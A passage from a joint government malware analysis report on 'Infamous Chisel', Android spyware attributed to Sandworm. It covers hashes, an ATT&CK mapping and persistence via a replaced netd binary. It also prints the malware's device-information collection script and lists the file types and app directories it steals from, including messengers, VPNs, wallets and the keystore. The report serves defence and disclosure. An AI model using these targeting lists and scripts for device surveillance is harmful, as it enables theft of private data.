<li>Infamous Chisel provides network backdoor access via a Tor (The Onion Router) hidden service and Secure Shell (SSH).</li>
<li>Other capabilities include network monitoring, traffic collection, SSH access, network scanning, and SCP file transfer.</li>
</ul>
<h2>Overview</h2>
<p>The UK National Cyber Security Centre (NCSC), the U.S. National Security Agency (NSA), U.S. Cybersecurity and Infrastructure Security Agency (CISA), U.S. Federal Bureau of Investigation (FBI), New Zealand’s National Cyber Security Centre (NCSC-NZ), the Canadian Centre for Cyber Security – part of the Canada’s Communications Security Establishment (CSE), and Australian Signals Directorate (ASD) are aware that the actor known as Sandworm has used a new mobile malware in a campaign targeting Android devices used by the Ukrainian military. The malware is referred to here as Infamous Chisel.</p>
<p>Organizations from the United Kingdom, United States, Australia, Canada, and New Zealand have previously linked the Sandworm actor to the Russian GRU's Main Centre for Special Technologies GTsST.</p>
<p>Download the PDF version of this report: <a href="https://www.ncsc.gov.uk/static-assets/documents/malware-analysis-reports/infamous-chisel/NCSC-MAR-Infamous-Chisel.pdf">PDF, 672 KB</a></p>
<p>For a downloadable copy of IOCs, see:</p>





<div class="align-center c-file">
    <div class="c-file__download">
    <a href="/sites/default/files/2023-08/AR23-243A%20Infamous%20Chisel%20Malware%20Analysis%20Report.stix_.json" class="c-file__link" target="_blank">AR23-243A STIX JSON</a>
    <span class="c-file__size">(JSON,       30.31 KB
  )</span>
  </div>
</div>





<div class="align-center c-file">
    <div class="c-file__download">
    <a href="/sites/default/files/2023-08/AR23-243A.stix_.xml" class="c-file__link" target="_blank">AR23-243A STIX XML</a>
    <span class="c-file__size">(XML,       38.17 KB
  )</span>
  </div>
</div>
<h2>Malware Summary</h2>
<p>Infamous Chisel is a collection of components which enable persistent access to an infected Android device over the Tor network, and which periodically collates and exfiltrates victim information from compromised devices. The information exfiltrated is a combination of system device information, commercial application information, and applications specific to the Ukrainian military.</p>
<p>The malware periodically scans the device for information and files of interest, matching a predefined set of file extensions. It also contains functionality to periodically scan the local network collating information about active hosts, open ports, and banners.</p>
<p>Infamous Chisel also provides remote access by configuring and executing Tor with a hidden service which forwards to a modified Dropbear binary providing a SSH connection.</p>
<p>Other capability includes network monitoring and traffic collection, SSH access, network scanning, and SCP file transfer.</p>
<div>
<h2>Malware details</h2>
<h3>Metadata</h3>
<table>
<tbody>
<tr>
<th scope="row">
<p><strong>Filename</strong></p>
</th>
<td>
<p>killer</p>
</td>
</tr>
<tr>
<th scope="row">
<p><strong>Description</strong></p>
</th>
<td>
<p>Infamous Chisel - Process manipulation for netd</p>
<p>ELF 32-bit ARM</p>
</td>
</tr>
<tr>
<th scope="row">
<p><strong>Size</strong></p>
</th>
<td>
<p>30160 bytes</p>
</td>
</tr>
<tr>
<th scope="row">
<p><strong>MD5</strong></p>
</th>
<td>
<p>512eb94ee86e8d5b27ec66af98a2a8c4</p>
</td>
</tr>
<tr>
<th scope="row">
<p><strong>SHA-1</strong></p>
</th>
<td>
<p>ad6eb2a7096b0e29cd93b8b1f60052fed7632ab9</p>
</td>
</tr>
<tr>
<th scope="row">
<p><strong>SHA-256</strong></p>
</th>
<td>
<p>5866e1fa5e262ade874c4b869d57870a88e6a8f9d5b9c61bd5d6a323e763e021</p>
</td>
</tr>
</tbody>
</table>
<p>&nbsp;</p>
<table>
<tbody>
<tr>
<th scope="row">
<p><strong>Filename</strong></p>
</th>
<td>
<p>blob</p>
</td>
</tr>
<tr>
<th scope="row">
<p><strong>Description</strong></p>
</th>
<td>
<p>Infamous Chisel - Decompressor and launcher for Tor process</p>
<p>ELF 32-bit ARM</p>
</td>
</tr>
<tr>
<th scope="row">
<p><strong>Size</strong></p>
</th>
<td>
<p>2131691 bytes</p>
</td>
</tr>
<tr>
<th scope="row">
<p><strong>MD5</strong></p>
</th>
<td>
<p>2cfa1f3e0467b8664cbf3a6d412916d6</p>
</td>
</tr>
<tr>
<th scope="row">
<p><strong>SHA-1</strong></p>
</th>
<td>
<p>b681a2b64d150a4b16f64455913fbacd97d9b490</p>
</td>
</tr>
<tr>
<th scope="row">
<p><strong>SHA-256</strong></p>
</th>
<td>
<p>2d19e015412ef8f8f7932b1ad18a5992d802b5ac62e59344f3aea2e00e0804ad</p>
</td>
</tr>
</tbody>
</table>
<p>&nbsp;</p>
<table>
<tbody>
<tr>
<th scope="row">
<p><strong>Filename</strong></p>
</th>
<td>
<p>ndbr_armv7l</p>
</td>
</tr>
<tr>
<th scope="row">
<p><strong>Description</strong></p>
</th>
<td>
<p>Infamous Chisel - Multi-call binary with many utilities:</p>
<p>dropbear, dropbearkey, ssh, scp, nmap, dbclient, watchdog, rmflag, mkflag</p>
<p>ELF 32-bit ARM</p>
</td>
</tr>
<tr>
<th scope="row">
<p><strong>Size</strong></p>
</th>
<td>
<p>328296 bytes</p>
</td>
</tr>
<tr>
<th scope="row">
<p><strong>MD5</strong></p>
</th>
<td>
<p>0905e83411c0418ce0a8d3ae54ad89a6</p>
</td>
</tr>
<tr>
<th scope="row">
<p><strong>SHA-1</strong></p>
</th>
<td>
<p>917db380b22fad02e7f21f11d1b4e8a5ad47c61c</p>
</td>
</tr>
<tr>
<th scope="row">
<p><strong>SHA-256</strong></p>
</th>
<td>
<p>5c5323bd17fd857a0e77be4e637841dad5c4367a72ac0a64cc054f78f530ba37</p>
</td>
</tr>
</tbody>
</table>
<p>&nbsp;</p>
<table>
<tbody>
<tr>
<th scope="row">
<p><strong>Filename</strong></p>
</th>
<td>
<p>ndbr_i686</p>
</td>
</tr>
<tr>
<th scope="row">
<p><strong>Description</strong></p>
</th>
<td>
<p>Infamous Chisel - Multi-call binary with many utilities:</p>
<p>dropbear, dropbearkey, ssh, scp, nmap, dbclient, watchdog, rmflag, mkflag</p>
<p>ELF 32-bit Intel 80386</p>
</td>
</tr>
<tr>
<th scope="row">
<p><strong>Size</strong></p>
</th>
<td>
<p>450340 bytes</p>
</td>
</tr>
<tr>
<th scope="row">
<p><strong>MD5</strong></p>
</th>
<td>
<p>7e548ef96d76d2f862d6930dcc67ef82</p>
</td>
</tr>
<tr>
<th scope="row">
<p><strong>SHA-1</strong></p>
</th>
<td>
<p>7d11aefc26823712ad8de37489f920fae679b845</p>
</td>
</tr>
<tr>
<th scope="row">
<p><strong>SHA-256</strong></p>
</th>
<td>
<p>3cf2de421c64f57c173400b2c50bbd9e59c58b778eba2eb56482f0c54636dd29</p>
</td>
</tr>
</tbody>
</table>
<p>&nbsp;</p>
<table>
<tbody>
<tr>
<th scope="row">
<p><strong>Filename</strong></p>
</th>
<td>
<p>db</p>
</td>
</tr>
<tr>
<th scope="row">
<p><strong>Description</strong></p>
</th>
<td>
<p>Infamous Chisel - Multi-call binary with many utilities:</p>
<p>dropbear, dropbearkey, ssh, scp, nmap, dbclient, watchdog, rmflag, mkflag</p>
<p>ELF 32-bit ARM</p>
</td>
</tr>
<tr>
<th scope="row">
<p><strong>Size</strong></p>
</th>
<td>
<p>5593884 bytes</p>
</td>
</tr>
<tr>
<th scope="row">
<p><strong>MD5</strong></p>
</th>
<td>
<p>04d0606d90bba826e8a609b3dc955d4d</p>
</td>
</tr>
<tr>
<th scope="row">
<p><strong>SHA-1</strong></p>
</th>
<td>
<p>ffaeba9a9fb4260b981fb10d79dbb52ba291fc94</p>
</td>
</tr>
<tr>
<th scope="row">
<p><strong>SHA-256</strong></p>
</th>
<td>
<p>338f8b447c95ba1c3d8d730016f0847585a7840c0a71d5054eb51cc612f13853</p>
</td>
</tr>
</tbody>
</table>
<p>&nbsp;</p>
<table>
<tbody>
<tr>
<th scope="row">
<p><strong>Filename</strong></p>
</th>
<td>
<p>db.bz2</p>
</td>
</tr>
<tr>
<th scope="row">
<p><strong>Description</strong></p>
</th>
<td>
<p>Bzip compressed data containing the Infamous Chisel Multi-Call binary (db)</p>
</td>
</tr>
<tr>
<th scope="row">
<p><strong>Size</strong></p>
</th>
<td>
<p>5593884 bytes</p>
</td>
</tr>
<tr>
<th scope="row">
<p><strong>MD5</strong></p>
</th>
<td>
<p>c4b5c8bdf95fe636a6e9ebba0a60c483</p>
</td>
</tr>
<tr>
<th scope="row">
<p><strong>SHA-1</strong></p>
</th>
<td>
<p>cdad1bee2e88581b7fa7af5698293435667d2550</p>
</td>
</tr>
<tr>
<th scope="row">
<p><strong>SHA-256</strong></p>
</th>
<td>
<p>ef466e714d5250e934e681bda6ebdecd314670bb141f12a1b02c9afddbd93428</p>
</td>
</tr>
</tbody>
</table>
<p>&nbsp;</p>
<table>
<tbody>
<tr>
<th scope="row">
<p><strong>Filename</strong></p>
</th>
<td>
<p>td</p>
</td>
</tr>
<tr>
<th scope="row">
<p><strong>Description</strong></p>
</th>
<td>
<p>Standard Tor P2P network application – likely actor compiled</p>
<p>ELF 32-bit ARM</p>
</td>
</tr>
<tr>
<th scope="row">
<p><strong>Size</strong></p>
</th>
<td>
<p>5265772 bytes</p>
</td>
</tr>
<tr>
<th scope="row">
<p><strong>MD5</strong></p>
</th>
<td>
<p>1f2c118b29e48cc5a5df46cddd399334</p>
</td>
</tr>
<tr>
<th scope="row">
<p><strong>SHA-1</strong></p>
</th>
<td>
<p>f6368ae2eec8cf46a7e88559f27dbbe4e7c02380</p>
</td>
</tr>
<tr>
<th scope="row">
<p><strong>SHA-256</strong></p>
</th>
<td>
<p>33a2be6638be67ba9117e0ac7bad26b12adbcdf6f8556c4dc2ff3033a8cdf14f</p>
</td>
</tr>
</tbody>
</table>
<p>&nbsp;</p>
<table>
<tbody>
<tr>
<th scope="row">
<p><strong>Filename</strong></p>
</th>
<td>
<p>td.bz2</p>
</td>
</tr>
<tr>
<th scope="row">
<p><strong>Description</strong></p>
</th>
<td>
<p>Bzip compressed data containing the standard Tor P2P network application (td)</p>
</td>
</tr>
<tr>
<th scope="row">
<p><strong>Size</strong></p>
</th>
<td>
<p>1840669 bytes</p>
</td>
</tr>
<tr>
<th scope="row">
<p><strong>MD5</strong></p>
</th>
<td>
<p>452b6c35f44f55604386849f9e671cc0</p>
</td>
</tr>
<tr>
<th scope="row">
<p><strong>SHA-1</strong></p>
</th>
<td>
<p>2df1e320851b26947ab1ea07eaccbd4d3762c68e</p>
</td>
</tr>
<tr>
<th scope="row">
<p><strong>SHA-256</strong></p>
</th>
<td>
<p>001208a304258c23a0b3794abd8a5a21210dfeaf106195f995a6f55d75ef89cd</p>
</td>
</tr>
</tbody>
</table>
<p>&nbsp;</p>
<table>
<tbody>
<tr>
<th scope="row">
<p><strong>Filename</strong></p>
</th>
<td>
<p>tcpdump</p>
</td>
</tr>
<tr>
<th scope="row">
<p><strong>Description</strong></p>
</th>
<td>
<p>Standard Tcpdump utility – likely actor compiled</p>
<p>ELF 32-bit ARM</p>
</td>
</tr>
<tr>
<th scope="row">
<p><strong>Size</strong></p>
</th>
<td>
<p>759528 bytes</p>
</td>
</tr>
<tr>
<th scope="row">
<p><strong>MD5</strong></p>
</th>
<td>
<p>4bdf7f719651d9a762d90e9f33f6bb01</p>
</td>
</tr>
<tr>
<th scope="row">
<p><strong>SHA-1</strong></p>
</th>
<td>
<p>500b953d63a0dbdc76dc3f51c32e3acab92f3ddc</p>
</td>
</tr>
<tr>
<th scope="row">
<p><strong>SHA-256</strong></p>
</th>
<td>
<p>140accb18ba9569b43b92da244929bc009c890916dd703794daf83034e349359</p>
</td>
</tr>
</tbody>
</table>
<h3>MITRE ATT&amp;CK<sup>®</sup></h3>
<p>This report has been compiled with respect to the MITRE ATT&amp;CK® framework, a globally accessible knowledge base of adversary tactics and techniques based on real-world observations.</p>
<table class="tablesaw tablesaw-stack" data-tablesaw-mode="stack" data-tablesaw-minimap>
<thead>
<tr>
<td>
<p><strong>Tactic</strong></p>
</td>
<td>
<p><strong>ID</strong></p>
</td>
<td>
<p><strong>Technique</strong></p>
</td>
<td>
<p><strong>Procedure</strong></p>
</td>
</tr>
</thead>
<tbody>
<tr>
<td>
<p>Execution</p>
</td>
<td>
<p><a href="https://attack.mitre.org/techniques/T1569">T1569</a></p>
</td>
<td>
<p>System Services</p>
</td>
<td>
<p>Infamous Chisel - netd replaces the legitimate netd.</p>
</td>
</tr>
<tr>
<td>
<p>Persistence</p>
</td>
<td>
<p><u><a href="https://attack.mitre.org/techniques/T1398/">T1398 (Mobile)</a></u></p>
</td>
<td>
<p>Boot or Logon Initialization Scripts</p>
</td>
<td>
<p>Infamous Chisel - netd replaces the legitimate netd.</p>
</td>
</tr>
<tr>
<td>
<p>Persistence</p>
</td>
<td>
<p><a href="https://attack.mitre.org/techniques/T1625">T1625</a></p>
<p><u>(Mobile)</u></p>
</td>
<td>
<p>Hijack Execution Flow</p>
</td>
<td>
<p>Infamous Chisel - netd replaces the legitimate netd and is executed by init inheriting root privileges.</p>
</td>
</tr>
<tr>
<td>
<p>Privilege Escalation</p>
<p>&nbsp;</p>
</td>
<td>
<p><u><a href="https://attack.mitre.org/techniques/T1626/">T1626 (Mobile)</a></u></p>
</td>
<td>
<p>Abuse Elevation Control Mechanism:</p>
</td>
<td>
<p>Infamous Chisel - netd executes shell scripts as the root user of the device.</p>
</td>
</tr>
<tr>
<td>
<p>Defense Evasion</p>
</td>
<td>
<p><a href="https://attack.mitre.org/techniques/T1629/">T1629 (Mobile)</a></p>
</td>
<td>
<p>Impair Defenses</p>
</td>
<td>
<p>Infamous Chisel - netd checks that it is executed by init and at the path for the legitimate netd.</p>
</td>
</tr>
<tr>
<td>
<p>Defense Evasion</p>
</td>
<td>
<p><a href="https://attack.mitre.org/techniques/T1406/">T1406 (Mobile)</a></p>
</td>
<td>
<p>Obfuscated Files or Information</p>
</td>
<td>
<p>Infamous Chisel - blob decompresses executables from bzip archives.</p>
</td>
</tr>
<tr>
<td>
<p>Credential Access</p>
</td>
<td>
<p><a href="https://attack.mitre.org/techniques/T1557">T1557</a></p>
</td>
<td>
<p>Adversary-in-the-Middle</p>
</td>
<td>
<p>Infamous Chisel - mDNSResponder is deployed alongside this malware and could potentially be used for DNS poisoning.</p>
</td>
</tr>
<tr>
<td>
<p>Credential Access</p>
</td>
<td>
<p><u><a href="https://attack.mitre.org/techniques/T1634/">T1634 (Mobile)</a></u></p>
</td>
<td>
<p>Credentials from Password Stores</p>
</td>
<td>
<p>Infamous Chisel - netd scrapes multiple files containing credentials and key information.</p>
</td>
</tr>
<tr>
<td>
<p>Credential Access</p>
</td>
<td>
<p><a href="https://attack.mitre.org/techniques/T1040">T1040</a></p>
</td>
<td>
<p>Network Sniffing</p>
</td>
<td>
<p>Infamous Chisel - tcpdump is deployed alongside this malware and has the ability to sniff network interfaces and monitor network traffic.</p>
</td>
</tr>
<tr>
<td>
<p>Discovery</p>
</td>
<td>
<p><a href="https://attack.mitre.org/techniques/T1420/">T1420 (Mobile)</a></p>
</td>
<td>
<p>File and Directory Discovery</p>
</td>
<td>
<p>Infamous Chisel - netd enumerates multiple data directories to discover files of interest.</p>
</td>
</tr>
<tr>
<td>
<p>Discovery</p>
</td>
<td>
<p><a href="https://attack.mitre.org/techniques/T1430/">T1430 (Mobile)</a></p>
</td>
<td>
<p>Location Tracking</p>
</td>
<td>
<p>Infamous Chisel - netd collects GPS information.</p>
</td>
</tr>
<tr>
<td>
<p>Discovery</p>
</td>
<td>
<p><a href="https://attack.mitre.org/techniques/T1418/">T1418 (Mobile)</a></p>
</td>
<td>
<p>Software Discovery</p>
</td>
<td>
<p>Infamous Chisel - netd collects a list of installed packages.</p>
</td>
</tr>
<tr>
<td>
<p>Discovery</p>
</td>
<td>
<p><a href="https://attack.mitre.org/techniques/T1426/">T1426 (Mobile)</a></p>
</td>
<td>
<p>System Information Discovery</p>
</td>
<td>
<p>Infamous Chisel - netd collects various system information such as the Android ID and other hardware information.</p>
</td>
</tr>
<tr>
<td>
<p>Discovery</p>
</td>
<td>
<p><a href="https://attack.mitre.org/techniques/T1422/">T1422 (Mobile)</a></p>
</td>
<td>
<p>System Network Configuration Discovery</p>
</td>
<td>
<p>Infamous Chisel - netd collects IP interface configuration information.</p>
</td>
</tr>
<tr>
<td>
<p>Discovery</p>
</td>
<td>
<p><a href="https://attack.mitre.org/techniques/T1421/">T1421 (Mobile)</a></p>
</td>
<td>
<p>System Network Connections Discovery</p>
</td>
<td>
<p>Infamous Chisel - netd performs IP scanning of the local network to discover other devices.</p>
</td>
</tr>
<tr>
<td>
<p>Collection</p>
</td>
<td>
<p><u><a href="https://attack.mitre.org/techniques/T1533/">T1533 (Mobile)</a></u></p>
</td>
<td>
<p>Data from Local System</p>
</td>
<td>
<p>Infamous Chisel - netd automatically collects files from the local system based on a predefined list of file extensions.</p>
</td>
</tr>
<tr>
<td>
<p>Collection</p>
</td>
<td>
<p><a href="https://attack.mitre.org/techniques/T1074/001">T1074.001</a></p>
</td>
<td>
<p>Data Staged: Local Data Staging</p>
</td>
<td>
<p>Infamous Chisel - netd creates multiple temporary files in the system to hold collected information.</p>
</td>
</tr>
<tr>
<td>
<p>Collection</p>
</td>
<td>
<p><a href="https://attack.mitre.org/techniques/T1114/001">T1114.001</a></p>
</td>
<td>
<p>Email Collection: Local Email Collection</p>
</td>
<td>
<p>Infamous Chisel - netd exfiltrates files from application and data directories containing communication data.</p>
</td>
</tr>
<tr>
<td>
<p>Command and Control</p>
</td>
<td>
<p><u><a href="https://attack.mitre.org/techniques/T1437/">T1473 (Mobile)</a></u></p>
</td>
<td>
<p>Application Layer Protocol:</p>
</td>
<td>
<p>Infamous Chisel - db provides SCP functionality.</p>
<p>&nbsp;</p>
</td>
</tr>
<tr>
<td>
<p>Command and Control</p>
</td>
<td>
<p><a href="https://attack.mitre.org/techniques/T1521/">T1521 (Mobile)</a></p>
</td>
<td>
<p>Encrypted Channel</p>
</td>
<td>
<p>Infamous Chisel - td is deployed alongside this malware providing a Tor hidden service relaying connections to SSH program.</p>
</td>
</tr>
<tr>
<td>
<p>Command and Control</p>
</td>
<td>
<p><a href="https://attack.mitre.org/techniques/T1572">T1572</a></p>
</td>
<td>
<p>Protocol Tunnelling</p>
</td>
<td>
<p>Infamous Chisel - td is deployed alongside this malware providing a local Socks connection for db.</p>
</td>
</tr>
<tr>
<td>
<p>Command and Control</p>
</td>
<td>
<p><a href="https://attack.mitre.org/techniques/T1219">T1219</a></p>
</td>
<td>
<p>Remote Access Software</p>
</td>
<td>
<p>Infamous Chisel - db provides a SSH server and client.</p>
</td>
</tr>
<tr>
<td>
<p>Exfiltration</p>
</td>
<td>
<p><a href="https://attack.mitre.org/techniques/T1020">T1020</a></p>
</td>
<td>
<p>Automated Exfiltration</p>
</td>
<td>
<p>Infamous Chisel - netd automatically exfiltrates files at regular intervals.</p>
</td>
</tr>
<tr>
<td>
<p>Exfiltration</p>
</td>
<td>
<p><a href="https://attack.mitre.org/techniques/T1029">T1029</a></p>
</td>
<td>
<p>Scheduled Transfer</p>
</td>
<td>
<p>Infamous Chisel - netd automatically exfiltrates files at regular intervals.</p>
</td>
</tr>
<tr>
<td>
<p>Impact</p>
</td>
<td>
<p><a href="https://attack.mitre.org/techniques/T1489/">T1489</a></p>
</td>
<td>
<p>Service Stop</p>
</td>
<td>
<p>Infamous Chisel – netd replaces the legitimate netd.</p>
</td>
</tr>
</tbody>
</table>
<div>
<h2>Functionality</h2>
<h3>Overview</h3>
<p>Infamous Chisel is a collection of multiple components. For <code>netd</code>, <code>killer</code>, <code>blob</code>, and <code>td</code> functionality can be extrapolated from references between them. The function of other binaries changes depending on the command line parameters that are supplied. It is likely that interaction takes place over the SSH remote shell connection configured by <code>netd</code>.</p>
<h3>Overview of the Components</h3>
<table class="tablesaw tablesaw-stack" data-tablesaw-mode="stack" data-tablesaw-minimap>
<thead>
<tr>
<td>
<p><strong>Filename</strong></p>
</td>
<td>
<p><strong>Description</strong></p>
</td>
</tr>
</thead>
<tbody>
<tr>
<td>
<p>netd</p>
</td>
<td>
<p>This component is used to perform automated device information collection and exfiltration.</p>
</td>
</tr>
<tr>
<td>
<p>killer</p>
</td>
<td>
<p>This component kills the malicious netd process.</p>
</td>
</tr>
<tr>
<td>
<p>blob</p>
</td>
<td>
<p>This component is executed by netd and is responsible for configuring and executing the Tor utility td.</p>
</td>
</tr>
<tr>
<td>
<p>td</p>
</td>
<td>
<p>This utility is Tor with no obvious modifications.</p>
</td>
</tr>
<tr>
<td>
<p>tcpdump</p>
</td>
<td>
<p>This utility is tcpdump with no obvious modifications.</p>
</td>
</tr>
<tr>
<td>
<p>ndbr_armv7l ndbr_i686</p>
</td>
<td>
<p>These utilities are multi-call containing:</p>
<p>dropbear, dropbearkey, ssh, scp, nmap, dbclient, watchdog, rmflag, mkflag. dropbear has been modified as described in the section Mutli-call binaries (Dropbear function modifications). ARM and x86 variants.</p>
</td>
</tr>
<tr>
<td>
<p>db</p>
</td>
<td>
<p>This utility is multi-call containing:</p>
<p>dropbear, dropbearkey, ssh, scp, nmap, dbclient, watchdog, rmflag, mkflag. dropbear has been modified as described in the section Mutli-call binaries (Dropbear function modifications).</p>
</td>
</tr>
</tbody>
</table>
</div>
<h3>Persistence</h3>
<p><code>netd</code> is designed to persist on the system by replacing the legitimate <code>netd</code> system binary at the path <code>/system/bin/netd</code>. This replacement is not carried out by the malware, but it can be extrapolated from the checks that it carries out. This is the only Infamous Chisel component which persists.</p>
<p>When the malicious <code>netd</code> is executed, it will check if <code>init</code> is the parent process which executed it. This parent process is responsible for creating the processes listed in the script <code>init.rc</code>. The malicious replacement netd when executed in this way will fork and execute the legitimate process backed up at the path&nbsp;<code>/system/bin/netd_</code>&nbsp;passing through the command line parameters. This retains the normal functionality of <code>netd</code>, while allowing the malicious <code>netd</code> to execute as root. This replacement would require an escalated privilege level to perform.</p>
<p>If it doesn’t find itself at the <code>/system/bin/netd</code> path, it will fork and set its parent process ID to <code>1</code>, also attempting to kill the legitimate <code>netd</code> process.</p>
<div>
<h2>Components</h2>
<h3>netd</h3>
<p>The <code>netd</code> component of Infamous Chisel provides the bulk of the custom functionality which the actor deploys. The main purpose of <code>netd</code> is to collate and exfiltrate information from the compromised device at set intervals. It uses a combination of shell scripts and commands to collect device information. It also searches multiple directories to which files matching a predefined set of extensions are exfiltrated.</p>
<h4>Exfiltration Logic</h4>
</div>
</div>
<p>All file exfiltration is performed as detailed in the Communications (File exfiltration)&nbsp;Section of this report. Whenever a file is selected for exfiltration, it is MD5-hashed and cross-referenced with a list of previously sent file hashes held in a file at one of three locations supporting different Android versions. The first existing directory path will be used:</p>
<ul>
<li><code>/sdcard/Android/data/.google.index</code></li>
<li><code>/storage/emulated/0/Android/data/.google.index</code></li>
<li><code>/storage/emulated/1/Android/data/.google.index</code></li>
</ul>
<p>The file exfiltration is considered complete when the server sends <code>Success</code> anywhere in its response. As this exfiltration uses a Hypertext Transfer Protocol (HTTP) POST, this server response is also expected to be HTTP, but this is not explicitly checked for.</p>
<p>The 16 raw bytes of the MD5 are appended to the end of the <code>.google.index file</code>, ensuring that the same file isn’t sent multiple times. As the <code>.google.index</code> file contains raw bytes, without prior knowledge, it would appear to contain random data. The initial allocation size is 256 Kb filled with NULLs providing space for up to a maximum of 16,384 file hashes. All hash entries will be checked for every file prior to exfiltration.</p>
<p>When the end of the <code>.google.index</code> file is reached, the position is reset to the start, overwriting the previous hashes. This means if the number of files to exfiltrate from the device exceeds 16,384, files will be sent multiple times.</p>
<h4>Information Gathering</h4>
<p>On execution, the Infamous Chisel <code>netd</code> component enters a main loop that executes indefinitely where various timers trigger the execution of different tasks. All timer actions are executed immediately on first execution, and then at the specific intervals.</p>
<h5>File and Device Information Exfiltration</h5>
<p>Every 86,000 seconds (23 hours, 53 minutes, and 20 seconds) the following actions are performed:</p>
<p><strong>1. File exfiltration from data directories</strong></p>
<p>The following directories are recursively searched for files matching the extensions listed. When a file is found by this search, it is exfiltrated as detailed in the Communications (File exfiltration) Section of this report.</p>
<p>File extension list:</p>
<table>
<tbody>
<tr>
<td>.dat, .bak, .xml, .txt, .ovpn, .xml, wa.db, msgstore.db, .pdf, .xlsx, .csv, .zip, telephony.db, .png, .jpg, .jpeg, .kme, database.hik, database.hik-journal, ezvizlog.db, cache4.db, contacts2.db, .ocx, .gz, .rar, .tar, .7zip, .zip, .kmz, locksettings.db, mmssms.db, telephony.db, signal.db, mmssms.db, profile.db, accounts.db, PyroMsg.DB, .exe, .kml</td>
</tr>
</tbody>
</table>
<p>Directory list:</p>
<ul>
<li><code>/sdcard</code></li>
<li><code>/storage/emulated/0/</code></li>
<li><code>/data/media</code></li>
<li><code>/data/data/de.blinkt.openvpn</code></li>
<li><code>/data/data/org.thoughtcrime.securesms</code></li>
<li><code>/data/data/net.openvpn.openvpn</code></li>
<li><code>/data/data/org.telegram.messenger</code></li>
<li><code>/data/data/vpn.fastvpn.freevpn</code></li>
<li><code>/data/data/eu.thedarken.wldonate</code></li>
<li><code>/data/data/com.android.providers.contacts</code></li>
<li><code>/data/data/com.android.providers.telephony</code></li>
<li><code>/data/data/com.google.android.gm</code></li>
<li><code>/data/system/users/0/</code></li>
</ul>
<p>Along with other military specific application directories.</p>
<p><strong>2. Information collection script</strong></p>
<p>An information collection script collates various hardware configuration information about the device.</p>
<p>The script is written to the location: <code>/data/local/tmp/.android.cache.sh</code> and then executed by <code>netd</code> using the command <code>/system/bin/sh -c /data/local/tmp/.android.cache.sh</code></p>
<p><code>.android.cache.sh</code> contains the following shell script:</p>
<table>
<tbody>
<tr>
<td>
<p>#!/system/bin/sh</p>
<p>system/bin/<a>settings get secure android_id</a> &gt; /data/local/tmp/.aid.cache</p>
<p>system/bin/ip a &gt; /data/local/tmp/.syscache.csv</p>
<p>system/bin/pm list packages &gt; /data/local/tmp/.syspackages.csv</p>
<p>system/bin/getprop &gt; /data/local/tmp/<a>.sysinfo.csv</a></p>
</td>
</tr>
</tbody>
</table>
<table class="tablesaw tablesaw-stack" data-tablesaw-mode="stack" data-tablesaw-minimap>
<thead>
<tr>
<td>
<p><strong>Command</strong></p>
</td>
<td>
<p><strong>Description</strong></p>
</td>
<td>
<p><strong>Output filename</strong></p>
</td>
</tr>
</thead>
<tbody>
<tr>
<td>
<p>settings get secure android_id</p>
</td>
<td>
<p>Returns a hexadecimal string identifying the device uniquely.</p>
</td>
<td>
<p>.aid.cache</p>
</td>
</tr>
<tr>
<td>
<p>ip a</p>
</td>
<td>
<p>Lists networking information such as IP address, subnet and interface type on a per network interface basis.</p>
</td>
<td>
<p>.syscache.csv</p>
</td>
</tr>
<tr>
<td>
<p>pm list packages</p>
</td>
<td>
<p>List of installed applications on the device.</p>
</td>
<td>
<p>.syspackages.csv</p>
</td>
</tr>
<tr>
<td>
<p>getprop</p>
</td>
<td>
<p>Lists various device hardware information such as GPS, battery, manufacturer and language.</p>
</td>
<td>
<p>.sysinfo.csv</p>
</td>
</tr>
</tbody>
</table>
<p>All the information is written to the various files in the <code>/data/local</code> directory and exfiltrated, with the exception of the <code>.aid.cache</code> file. The <code>android_id</code> contained within this file is used to form part of the Uniform Resource Identifier (URI) detailed in the Communications&nbsp;Section of this report.</p>
<p><strong>3. File exfiltration from application directories</strong></p>
<p>The <code>/data/</code> directory is searched for the application directories:</p>
<ul>
<li><code>com.google.android.apps.authenticator2</code></li>
<li><code>net.openvpn.openvpn</code></li>
<li><code>free.vpn.unblock.proxy.vpnmaster</code></li>
<li><code>com.UCMobile.intl</code></li>
<li><code>com.brave.browser</code></li>
<li><code>com.opera.browser</code></li>
<li><code>com.hisense.odinbrowser</code></li>
<li><code>com.dzura</code></li>
<li><code>com.google.android.apps.docs</code></li>
<li><code>com.sec.android.app.myfiles</code></li>
<li><code>com.microsoft.skydrive</code></li>
<li><code>com.google.android.apps.walletnfcrel</code></li>
<li><code>com.paypal.android.p2pmobile</code></li>
<li><code>com.binance.dev</code></li>
<li><code>com.coinbase.android</code></li>
<li><code>com.wallet.crypto.trustapp</code></li>
<li><code>com.viber.voip</code></li>
<li><code>com.dropbox.android</code></li>
<li><code>com.android.providers.telephony</code></li>
<li><code>com.android.providers.contacts</code></li>
<li><code>com.cxinventor.file.explorer</code></li>
<li><code>com.elinke.fileserver</code></li>
<li><code>org.mozilla.firefox</code></li>
<li><code>com.whatsapp</code></li>
<li><code>org.thoughtcrime.securesms</code></li>
<li><code>org.telegram.messenger</code></li>
<li><code>org.telegram.messenger.web</code></li>
<li><code>com.discord</code></li>
<li><code>com.hikvisionsystems.app</code></li>
<li><code>com.hikvision.hikconnect</code></li>
<li><code>com.skype.raider</code></li>
<li><code>com.google.android.gm</code></li>
<li><code>com.android.chrome</code></li>
<li><code>org.chromium.webview_shell</code></li>
<li><code>keystore</code></li>
</ul>
<p>Along with some military application specific directories.</p>
<p>Every file in these directories regardless of type is exfiltrated.</p>
<p><strong>4. Specific file exfiltration</strong></p>
<p>The following files at the absolute paths are exfiltrated:</p>
<ul>
<li><code>/data/local/tmp/.syscache.csv</code></li>
<li><code>/data/local/tmp/.syspackages.csv</code></li>
<li><code>/data/local/tmp/.sysinfo.csv</code></li>
<li><code>/data/system/users/0/settings_ssaid.xml</code></li>
</ul>
<p>Along with some military application specific directories.</p>
<p>The files with the extension <code>.csv</code> are generated by the malware. The others are application specific files or system configuration information.</p>
<h5>Exfiltration of Configuration and Configuration Backup Files</h5>
<p>Every 600 seconds (10 minutes) the following directories are searched for files of type <code>.json</code> or <code>.json.bak</code> which are then immediately exfiltrated:</p>
<ul>
<li><code>/sdcard</code></li>
<li><code>/storage/emulated/0/</code></li>
<li><code>/data/media</code></li>
<li><code>/data/data/de.blinkt.openvpn</code></li>
<li><code>/data/data/org.thoughtcrime.securesms</code></li>
<li><code>/data/data/net.openvpn.openvpn</code></li>
<li><code>/data/data/org.telegram.messenger</code></li>
<li><code>/data/data/vpn.fastvpn.freevpn</code></li>
<li><code>/data/data/eu.thedarken.wldonate</code></li>
<li><code>/data/data/com.android.providers.contacts</code></li>
